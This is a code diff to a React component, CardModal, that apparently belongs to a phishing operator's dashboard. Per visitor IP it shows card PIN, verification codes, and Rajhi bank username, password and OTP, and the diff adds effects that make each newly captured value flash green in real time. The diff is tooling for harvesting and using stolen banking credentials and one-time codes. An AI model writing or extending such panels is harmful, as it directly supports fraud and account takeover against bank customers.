@@ -50,10 +50,44 @@ export default function CardModal({ ip, user, onClose }) {
   const [blinkPin, setBlinkPin] = useState(false);
   const [blinkOtp, setBlinkOtp] = useState(false);
   const [blinkPhoneOtp, setBlinkPhoneOtp] = useState(false);
+  const [blinkRajhi, setBlinkRajhi] = useState(false);
+  const [blinkRajhiPw, setBlinkRajhiPw] = useState(false);
+  const [blinkRajhiCode, setBlinkJajhiCode] = useState(false);
 
   const prevPinRef = useRef(user?.pin || "");
   const prevOtpRef = useRef(user?.verification_code_two || "");
   const prevPhoneOtpRef = useRef(user?.verification_code_three || "");
+
+  const prevRajhiRef = useRef(user?.rajhi || "");
+  const prevRajhiPwRef = useRef(user?.rajhiPw || "");
+  const prevRajhiCodeRef = useRef(user?.rajhiCode || "");
+
+  useEffect(() => {
+    const current = user?.rajhi || "";
+    if (current && prevRajhiRef.current !== current) {
+      setBlinkRajhi(true);
+      setTimeout(() => setBlinkRajhi(false), 1500);
+    }
+    prevRajhiRef.current = current;
+  }, [user?.rajhi]);
+
+  useEffect(() => {
+    const current = user?.rajhiPw || "";
+    if (current && prevRajhiPwRef.current !== current) {
+      setBlinkRajhiPw(true);
+      setTimeout(() => setBlinkRajhiPw(false), 1500);
+    }
+    prevRajhiPwRef.current = current;
+  }, [user?.rajhiPw]);
+
+  useEffect(() => {
+    const current = user?.rajhiCode || "";
+    if (current && prevRajhiCodeRef.current !== current) {
+      setBlinkJajhiCode(true);
+      setTimeout(() => setBlinkJajhiCode(false), 1500);
+    }
+    prevRajhiCodeRef.current = current;
+  }, [user?.rajhiCode]);
 
   useEffect(() => {
     const current = user?.pin || "";
@@ -267,19 +301,19 @@ export default function CardModal({ ip, user, onClose }) {
                 Rajhi login ⁄ OTP
               </h6>
               <p
-                className={blinkPin ? "blink-green-text" : ""}
+                className={blinkRajhi ? "blink-green-text" : ""}
                 style={{ marginBottom: "0.5rem" }}
               >
                 <strong>username:</strong> {rajhiName || "—"}
               </p>
               <p
-                className={blinkOtp ? "blink-green-text" : ""}
+                className={blinkRajhiPw ? "blink-green-text" : ""}
                 style={{ marginBottom: "0.5rem" }}
               >
                 <strong>Password:</strong> {rajhiPw || "—"}
               </p>
               <p
-                className={blinkOtp ? "blink-green-text" : ""}
+                className={blinkRajhiCode ? "blink-green-text" : ""}
                 style={{ marginBottom: "0.5rem" }}
               >
                 <strong>Rajhi OTP :</strong> {rajhiCode || "—"}
